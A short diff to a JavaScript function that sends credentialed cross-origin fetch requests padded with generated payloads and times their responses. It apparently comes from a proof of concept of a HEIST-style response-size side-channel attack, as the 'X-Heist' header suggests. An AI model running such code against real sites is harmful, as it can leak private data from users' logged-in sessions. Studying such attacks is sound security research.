@@ -13,7 +13,7 @@ function fetchUrl(site, payloadSize) {
   console.log('Payload size: '+ payloadSize);
   var payload = generatePayload(payloadSize);
 
-  site += '?a='+payload+'&b='+generatePayload(4000)+'&c='+generatePayload(4000)+'&d='+generatePayload(4000);
+  site += '?a='+payload+'&b='+generatePayload(4000);//+'&c='+generatePayload(4000)+'&d='+generatePayload(4000);
 
   console.log('setting interval');
   interval = setInterval(function(){
@@ -33,6 +33,9 @@ function fetchUrl(site, payloadSize) {
     redirect: 'manual',
     cache: 'no-cache',
     credentials: 'include',
+    headers: {
+      'X-Heist': 'blaat'
+    }
   })
   .then(function(result){
     T1 = performance.now();
